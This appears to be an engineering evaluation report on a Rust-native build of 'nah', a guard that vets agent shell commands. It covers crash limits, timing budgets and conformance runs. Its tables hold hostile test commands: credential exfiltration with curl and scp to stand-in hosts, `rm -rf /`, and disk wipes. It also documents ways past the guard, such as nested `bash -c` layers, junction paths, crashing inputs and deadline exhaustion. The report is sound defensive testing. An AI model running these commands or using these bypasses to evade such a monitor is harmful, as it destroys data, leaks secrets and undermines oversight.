# Rust rewrite, Phase 0: native nah

Spike: `spike/nah-native/`, nah v1.7.0 (rev 07fea9d), Rust 1.91.1. Raw notes on the plan's Phase 0, "Crash safety", "Duplicate danger rules" and "Rule gaps".

## Verdict

**Gate: go, with three design changes.** nah builds and decides natively on Windows and Linux. No logic disagreement with the official binary in anything compared. Nothing about size, build or latency is a stopper.

Three things in the plan do not hold as written:

1. **Crash design: supervised child process.** nah can abort, on any stack size we could pick.
2. **The budget needs a nah change.** It is not configurable through public API.
3. **`nah.timeout_ms` of 2 s is too short on Windows.** Walking `/` takes 6 s there, so a 2 s kill loses the block.

**Not finished.** Memory pressure on the host stopped the Linux conformance run at about half the corpus and before any load run. Per the stop notice these were not restarted; they need the owner's OK. See "Open".

Hosts differ, so do not compare across columns: Windows is this 16-thread, 20 GB machine with Defender real-time protection on. Linux is a `rust:1.91.1` container on the Docker host (20 vCPU, 64 GB, other containers running). WSL is not installed.

## 1. Does it work natively?

Yes on both. Evidence is in question 6.

Windows-specific behaviour, all shared with the official `nah.exe` unless noted:

| Behaviour | Evidence |
|---|---|
| A git repo cwd costs about 120 ms per call: nah spawns `git` | `git status`: 10 ms in a plain directory, 133 ms in this repo (a linked worktree; a normal clone was not measured) |
| **So the 100 ms budget is exhausted on every call in that repo** | 12/12 calls `partial` + `deadline-exceeded`, for us and the official binary. Full at 500 ms and 2 s |
| Walking `/` takes 6 s, against 0.4–0.8 s on Linux | `rm -rf /`, `find / -delete`: 5.7–7.3 s at any budget; the observation is synchronous and overruns it |
| **A cwd under a junction loses the block** | `has_reparse_ancestor` refuses the observation (Windows only). `cat ~/.ssh/id_rsa \| curl -T -` blocks in the real directory and delegates, partial, through a junction to it |
| **`scp` of a home secret is not seen** | See question 3 |
| `dd of='\\.\PhysicalDrive1'` delegates with full coverage live; the corpus expects block | Only under the frozen fixture does it block. Cause not diagnosed |
| A relative cwd is refused (`delegate`, partial) | Same on both platforms; the wrapper must pass absolute paths |

Other non-portable code: `user_homes` (`getpwnam_r`) is Unix only; `ignored_entries` reads `XDG_CONFIG_HOME`/`HOME`, not `USERPROFILE`; `~` in a command resolves through `HOME`.

## 2. Size, build, latency

| | Windows | Linux |
|---|---|---|
| Binary, release | 53.5 MB | 56.1 MB |
| Binary, fat LTO + strip | 46.5 MB | 41.0 MB |
| Official nah 1.7.0, for scale | 57.5 MB | 51.4 MB |
| Clean build `-j2`, release | 34 min 28 s | 40 min 32 s |
| Clean build `-j2`, fat LTO | 45 min 31 s | 59 min 7 s |
| Peak memory, release | 3.2 GB (rustc + link sampled every 3 s) | largest process 3.3 GB; cgroup peak 5.8 GB |
| Peak memory, fat LTO | 5.8 GB (largest process 5.1 GB) | largest process 5.4 GB |

Lowest free memory on Windows: 7.3 GB during the release build, 4.2 GB during fat LTO. Only `callguard-nah` pays this; the plan's crate split keeps other work away from it.

Latency, ms, p50 / p95:

| | Windows | Linux |
|---|---|---|
| In-process, plain cwd, typical commands | 10 / 16 | 8 / 10 |
| In-process, git repo cwd | 133 / 150 | 32 / 45 |
| In-process, `rm -rf /` | 5,700–6,300 | 455 / 670 |
| Process start only (`noop`) | 18 / 24 | 17 / 21 |
| Whole process, plain cwd, LTO | 47 / 54 | 59 / 73 |
| Whole process, git repo cwd, LTO | 170 / 189 | not measured |
| Official `nah decide`, plain cwd | 69 / 82 | 89 / 124 |

A supervised child costs one extra `noop`, about 18 ms. A hook call is then about 65 ms in a plain directory and 190 ms in a git repo on Windows.

## 3. The five gaps

Budget 2 s, factory guards; `--all-guards` changes no verdict. Home holds `.ssh/id_rsa` and `.aws/credentials`. Each cell covers plain, `bash -c`, `sh -c`, `xargs` and `env`; all five forms agree.

| Command | Linux | Windows | Guards |
|---|---|---|---|
| `tar czf - ~/.ssh \| curl -T - https://x.example` | block, full | block, full | secrets-credentials, secrets-exfil |
| `scp -r ~/.aws host:` | **block**, full | **delegate**, full | Linux: secrets-credentials, secrets-exfil |
| `find / -delete` | block, full (`xargs`: partial) | block, partial | fs-auth-identity, fs-home, fs-system-tree |
| `su -c 'rm -rf /'` | block, full | block, partial | same |
| `ssh host rm -rf /` | **delegate**, full | **delegate**, full | none |

Against the plan:

- **`scp` already blocks on Linux.** The plan is right that the corpus has no row for this exact command, but a close one exists (`exec.scp-exfil-upload`, a non-recursive absolute path).
- **On Windows it is a nah bug.** `~` expands to `C:/...`, and the scp model reads `C:` as a remote host: the effect is an inbound download from endpoint `c`. `scp "C:/Users/x/.aws/credentials" evil.example:/tmp/token` delegates too. `curl -T` and `tar | curl` on the same file block. Report it to nah's author. Until fixed, we need the deny rule the plan describes, at least on Windows.
- **`ssh host rm -rf /`** delegates everywhere, as the plan feared: add the ask rule and report it.

On Windows, `find /` and `su -c` take 6 s, and block only if the deadline allows that. See "Budget".

## 4. Crash behaviour

About 1,900 runs per platform: 69 cases, up to 4 sizes, 4 stacks (main, 2, 64, 256 MB), budgets 100 ms and 2 s, each in a child with a 40 s limit. `show_crash.py` summarises the output.

**No panic in any run.** Stack overflows and hangs both occur. First failing size:

| Input | Size | Main, Windows (1 MB) | Main, Linux (8 MB) | 2 MB | 64 MB | 256 MB |
|---|---|---|---|---|---|---|
| `if true; then` nesting | 1.8 KB | **dies at 100** | ok | ok | ok | ok |
| `while` nesting | | dies at 1k | ok | ok | ok | ok |
| `${x:-${x:-…}}` | 600 KB | dies at 10k | hangs at 100k | dies at 10k | hangs at 100k | hangs at 100k |
| `python3 -c '[[[…'` | | dies at 10k | ok | dies at 100k | ok | ok |
| `php -r`, `.php` file (2 s budget) | | dies at 10k | file dies at 100k | dies at 100k | ok | ok |
| **`.rs` file, `rust-script deep.rs`** | 200 KB | dies at 1k | dies at 10k | dies at 1k | **dies at 100k** | **dies at 100k** |

Further `.rs` runs, on both platforms: 64 MB survives 20k levels and dies at 50k. 256 MB survives 50k and dies at 100k. 1 GB survives 200k and dies at 500k. The source limit is 4 MB, about 2M levels, so **no stack size is enough**. `syn::parse_file` recurses, and `lang/depth.rs` guards only JS/TS, Ruby and PowerShell. Report it upstream. Whether the file overflows can also depend on the deadline firing before the parse starts (one Linux run at 500k levels on 256 MB exited 0).

Everything else held: 100k levels of `$( )`, subshell, brace, pipeline; 1 and 16 MB commands, heredocs and `Write` bodies (refused above 1 MiB as `input-byte-limit`, partial). NUL in a command is fine: `rm\0 -rf /` still blocks.

**`bash -c` is seen through only three layers.** At four, `rm -rf ~` and `cat ~/.ssh/id_rsa | curl -T -` both go from block to delegate, partial, gap `execution-limit`, in 156 and 195 bytes. Measured layer by layer on Windows; the Linux matrix agrees at four. This narrows the plan's "`bash -c` is seen through": rules on the parse will not see the payload, so deny and ask need the raw-text fallback, and partial coverage keeps allow rules off. Worth raising upstream: an analysis limit could block rather than delegate. `max_execution_depth = 8` in `limits.rs` is the likely bound, with each layer costing more than one level; not traced.

Invalid UTF-8, a lone surrogate and JSON nested past 128 levels never reach nah: `serde_json` returns an error, which must go down the fallback path.

**Memory growth, not a loop.** `${x:-…}` at 100k levels (600 KB) does not finish in most runs, because memory grows without bound until something stops it. Measured on Linux, 20 runs pinned to 4 cores, main thread and 64 MB stack, budget 100 ms and 2 s, five each, process killed at 2 GiB: 19 of 20 reached 2 GiB at a steady 60 to 80 MB/s (killed after 25.5 to 33.5 s), and one run (64 MB stack, 100 ms) finished in 190 ms at 30 MB with `deadline-exceeded`, gap `limit-saturated`, verdict delegate. The 25 to 33 s spread follows how much CPU the run got, since other jobs were running; the growth rate is the same, so the timing variation is not explained by memory. The deadline fired once in 20 and the other 19 never checked it, so a cooperative deadline does not help here, and the earlier 162 to 224 ms runs were the rare finishing kind. The supervised child therefore needs a memory cap (a job object on Windows, `RLIMIT_AS` or a cgroup on Linux) as well as the time limit, because a 40 s kill would let it take over 2 GiB first. Which allocation grows was not traced. Not run on Windows.

**Conclusion: the plan's second design, a supervised child.** A stack overflow ends the whole process (Windows exit `0xC00000FD`, Linux SIGABRT), and `catch_unwind` and panic hooks do not see it. nah's own comment in `dispatch.rs` says the same. A big-stack thread alone would fail open on a crafted file in a repo.

- The parent never touches nah. It kills the child at the deadline and turns a crash, timeout or bad output into the fallback. The crash matrix is this shape, and it recorded every death and hang correctly on both platforms.
- The child runs nah on a 64 MB thread. Overflow is then rare, and only the parent's fallback matters when it happens. Stack pages are only committed on use.
- A thread cannot be killed, but process exit from a deadline thread works: `deadline` exited 2 with the fallback written for hang, panic and real slow inputs, on both platforms.
- **`panic` setting:** no manifest in the tree sets it, and only our top-level profile counts. Default unwind is fine; a child panic is just a nonzero exit.
- **FFI:** tree-sitter's C core is linked (Java, PHP), and `nah-observe` has `unsafe` for `getpwnam_r` and `GetFileInformationByHandle`. A C fault is another thing only a process boundary contains.
- **Phase 2 edge:** nah spawns `git`. After killing the child, the parent must not wait for pipe EOF, because a grandchild can hold the pipe (up to `GIT_TIMEOUT`, 500 ms).

A crash must also not be a way past nah. Crafted input that kills nah reaches policy rules and the judge as "no parse", so allow rules cannot match it. The catastrophic backstops should run in the parent, where a crash cannot reach them.

## 5. Budget

**Where it attaches.** `nah-cli/src/pipeline.rs`: `PRODUCTION_EVIDENCE_BUDGET`, 100 ms in release and 60 s when `debug_assertions` is on, goes through `decide_bounded` into `EvidenceBudget::after`, which wraps `InvocationDeadline`. The first planning round gets half. `ObservationBudget` is different: it is what the engine hands an `ObservationResolver`, not a setting.

**Public API: no.** `decide_with` hardcodes the constant, and `decide_bounded` is private. Options:

| Option | Status | Assessment |
|---|---|---|
| Add `decide_with_budget` (`nah-budget.patch`, 26 lines) | Built and run on both platforms | **Recommended.** Send upstream; meanwhile pin a fork |
| `decide_replay` (fixed 60 s) | Read, not built | Needs our own `SourceProvider` and `ObservationResolver`; the host ones are `pub(crate)` |
| `[profile.release.package.nah-cli] debug-assertions = true` (fixed 60 s) | Read, not built | A hack, and nah never truncates, so a kill gives no partial evidence |

`[patch]` must name `nah-cli`, `nah-proto` and `nah-observe`, or the types mismatch.

**What exhaustion looks like.** Two shapes, both `coverage: partial`:

- **Expired after the host was bound:** `guard_evidence` is present, `refusals` holds `deadline-exceeded`, warning `effinterp evaluation stopped: deadline-exceeded`. It can still block from what it established.
- **Expired before:** `guard_evidence` is `None`, verdict delegate, warning `effinterp analysis unavailable: deadline-exceeded`.

**Detect with `coverage != full`, not with the gaps list:** `find /` came back partial with empty gaps. No run had a deadline hit with full coverage: 0 of 1,923 hits in the recorded conformance rows, oracle and spike.

**Idle** (no other load), Linux, all 8,858 rows, spike vs its own 60 s run:

| Set | Deadline hit at 100 ms | Verdict flips, 100 ms vs 60 s | Wall ms at 60 s, p50 / p95 / max |
|---|---|---|---|
| Linux, 8,858 rows | 537 (6.1 %) | 5, all block at 60 s, delegate at 100 ms | 78 / 471 / 2,979 |
| Windows fixtures, 238 rows | 66 | 0 | 58 / 3,825 / 5,970 |
| Linux rows on Windows, 885 (every 10th) | 372 | 0 | 117 / 5,753 / 7,554 |

The five flips: two 46-command `&&` chains ending in a home delete (564 and 578 ms at 60 s), `curl -X DELETE https://api.github.com/repos/owner/project`, `curl -X DELETE` against a Vault URL, and `hatch publish`.

**Under load, Linux** (all 8,858 rows, three budgets, each compared with the idle 60 s verdict of the same row). Load applied: `conf -load 16` starts 16 busy-loop goroutines (`GOMAXPROCS=16`), and the whole run is pinned with `taskset -c 0-3`, so the spike's process competes with 16 busy threads on 4 cores. That slows the median call 3.3 times (260 ms against 78 ms) and p95 2.8 times (1.3 s against 0.47 s). It is a heavy but ordinary level: a busy machine, not a starved one. The run took 2 h 51 min; another worker's `cargo build` ran in the same container for part of it and added load that was not measured. One load run per budget, so no variance estimate.

| Budget | Deadline hit | Verdict flips vs 60 s | Direction | Calls over 10 s wall |
|---|---|---|---|---|
| 100 ms | 3,417 (38.6 %) | **501 (5.7 %)**; 9 % of the 5,567 blocks lost | all block to delegate | 7 |
| 500 ms | 504 (5.7 %) | **3** | all block to delegate | 8 |
| 2 s | 62 (0.7 %) | **0** | none | 10 |

- At 100 ms the lost blocks are spread over the guards, mostly `git-remote-repo-delete` (158), `self-protection` (121), `git-remote-resource-delete` (43), `secrets-exfil` (41), `fs-system-tree` (18), `fs-home` (18). 499 of the 501 are rows the corpus expects to block.
- At 500 ms the three are the 46-command chains and `thirteen-status-wrappers`, all `fs-home`. At 2 s the same three still hit the deadline or came close (one at 2.5 s wall) and kept their block, because nah blocks from what it established before the deadline.
- No deadline hit came back with `coverage: full` at any budget.
- Wall time is not bounded by the budget. At 2 s, 19 calls took over 5 s and 10 over 10 s, up to 19 s, all in `fs-system-tree` (`mv /*` patterns and `find /` help text): the walk of `/` inside the observation callback does not check the deadline. Eight of the ten still blocked. Under a 10 s hard kill these ten would fall to the fallback instead.

**Under load, Windows: not run yet.** Waiting for the host to be free of other timing-sensitive work. The flips above are Linux only; Windows idle showed 0 flips, but its calls are 10 to 50 times slower than Linux's, so Windows may need a larger budget than the Linux numbers show.

**Recommendation: analysis budget 2 s, hard kill 10 s.** The provisional figure holds.

- 100 ms is not usable under load: it loses a block in one call of 18, and idle it already makes every call in a Windows git repo partial, which would disable allow rules there.
- 500 ms loses the 46-command chains under load. They are synthetic, but they are the shape of an agent chaining many commands before a delete.
- 2 s lost nothing on Linux at this load level. Whether it holds under heavier load is not measured; the margin at 2 s is the chain at 2.5 s against a 2 s budget, which still blocked, so some headroom exists. Windows is not measured under load, so the 2 s figure stays provisional for Windows until that run is done.
- The kill must outlast the Windows `/` walk (up to 8.6 s seen). Ten Linux calls ran past 10 s at the 2 s budget under load; these are hostile root-globbing inputs where falling back is acceptable.
- The plan's catastrophic backstops stay needed: they answer before any of this. Their disk-wipe pattern should include `\\.\PhysicalDrive`, which nah misses live.

## 6. Conformance

Spike vs official v1.7.0 binary, same real directories, `conformance/main.go`, adapted from the nah-wasm test. Rows are in fixture name order. Idle, no load.

| Set | Compared | Spike 100 ms: agree | Spike 60 s: agree | Disagreements |
|---|---|---|---|---|
| Linux, **all** | 8,858 | 8,812 (99.48 %) | 8,809 (99.45 %) | 100 ms: 45 oracle deadline, 1 spike deadline. 60 s: 49, all oracle deadline |
| Windows fixtures | 238 | 237 | 237 | 1: the oracle ran past 90 s on one row, see below |
| Linux rows on Windows, every 10th | 885 | 884 | 884 | 1: oracle deadline |

The Linux run was resumed once: the first 4,472 rows ran earlier, the other 4,386 later, same binaries. The official binary hit its own deadline on 646 rows, the spike on 537 at 100 ms.

**No logic disagreement.** Every one of the 49 at 60 s is the oracle running out of its own hardcoded 100 ms: it delegated where the spike, given time, blocked. A generous budget on our side does not reach 100 %, against the plan's expectation, because it widens this class: the oracle cannot be given more time. The one other disagreement is at 100 ms: `registry-publish.hatch`, where the oracle blocked and the spike ran past its own deadline (381 ms) and delegated; at 60 s it agrees. The official binary is also slower (Linux p50 106 ms vs 78 ms).

Matching corpus expectations on Linux: oracle 8,549, spike 8,593 at 100 ms and 8,598 at 60 s, of 8,858. Windows 218 of 238; oracle 217.

The other 20 Windows rows: the same verdict from the oracle wherever it answered. Eleven block under a different guard or none named, probably because the harness relocates the fixture home out of `C:\Users\test`. Eight expect block and get delegate; one expects delegate and gets block. A live spot-check of five delegates was inconclusive, because it lacked the fixture's repo and guard posture. Not diagnosed further; the gate is unaffected, since the oracle agrees on all of them.

**The 90 s row, `fs-system-tree.windows-pwsh-rm-program-files`, is the walk of `C:\Program Files`, not an oracle fault.** Six reruns of the official binary, spike (100 ms) and spike (2 s), alone on Windows while the Linux load run was going in Docker: the walk took 4.8 to 6.2 s in 16 of 18 calls. Two outliers: the oracle once 33 s, and the spike at 2 s once past the 90 s limit of the harness (killed, no output). The oracle's first call took 0.4 s and delegated (its own deadline, before the walk). Peak working set of the nah processes was 16 to 23 MB, so it is time, not memory. The deadline does not reach the walk, so one call in 18 ran far beyond the budget, for the spike as for the oracle. The cause of the slow outliers is probably the filesystem (Defender scanning, cold cache), which this run did not isolate. The 10 s hard kill covers it.

## 7. Which APIs, and nah's config

**Used:** `nah_cli::{decide_with, shipped_guard_states, all_shipped_guard_states_enabled, DecisionResult}`, `nah_proto::{ctx, decision, observation, tool}`, `nah_observe::fulfill_observation_request`.

**`~/.nah` is not read.** `decide_with` passes no `LiveState`, so no nap, trust, custom guards or records. Test: a home whose `built-ins.json` turns the secrets guards off. The official binary delegated and wrote `audit.jsonl`; in-process blocked and left the home empty.

**What is still read:**

| Read | Why | Guarantee needed |
|---|---|---|
| `<project>/.nah/project.toml` | **A project can enable shipped guards** (test: `npm publish` went from delegate to block) | Pass every default-off guard as explicit disable (`with_explicit_disable`); test passes. Only enables, so it cannot weaken us, but callguard's policy should be the only config. Unknown names give a warning only |
| Env vars the plan asks for | `HOME`, `USERPROFILE`, those a command names | Host fact, intended |
| Files a command demands | Scripts and imports under the project root | Intended; this is the analysis |
| `git` subprocess, `core.excludesFile`, `~/.config/git/ignore` | Repo facts; `GIT_*` is stripped from its env | Host fact, not nah config |

The observe closure is ours, so it can also filter queries. Not needed so far.

## Settled while measuring

- Toolchain 1.91.1 per nah's `rust-toolchain.toml`, not the host's 1.95. rustup installed it on first use.
- `cargo tree` misses `cc` because it is a build dependency of tree-sitter; Cargo.lock shows it.
- Extra crash inputs beyond the brief: other engine frontends, as inline code and as source files. That is how the `.rs` case surfaced.
- The prepared load run confines itself to 4 cores, so the shared Docker host is not saturated: `GOMAXPROCS=16 taskset -c 0-3 ./conf ... -load 16 -configs <budget>`, compared with `analyse.py flips`.
- `-j2` in the container too, so build numbers compare.
- `conf -done earlier.jsonl` skips rows that already have every config in that file, which is how the Linux conformance was resumed.
- Load runs share the container with other jobs, so their load level is not exact; each ran once.

## Open

**Windows load run, not run yet.** Same flips at 100 ms, 500 ms and 2 s on the 238 Windows fixtures and the 885 Linux rows on Windows, with the Windows binaries in `C:\Users\pierr\Documents\git\.callguard-target` (3 GB). It needs at least 8 GB of free memory and a host without other timing-sensitive work. The load on Windows has no `taskset`: set the process affinity of `conf-win.exe` to cores 0-3 after starting it (children inherit it), with `-load 16` and `GOMAXPROCS=16`. Compare with `analyse.py flips` against `win-windows.jsonl:60000` and `win-linuxrows.jsonl:60000`.

**For later phases:**

- Fork or upstream `decide_with_budget`.
- Report upstream: Rust source overflow, the `${x:-…}` unbounded memory growth, scp `C:` as host, `ssh host <destructive>`, `\\.\PhysicalDrive` live, four `bash -c` layers delegating.
- A normal clone on Windows, instead of this linked worktree.
- macOS not run; nothing here covers it.
- Defender is on and exclusions could not be read without admin. It may inflate Windows builds and the `/` walk. To test, the owner can run as admin: `Add-MpPreference -ExclusionPath C:\Users\pierr\Documents\git\.callguard-target`.
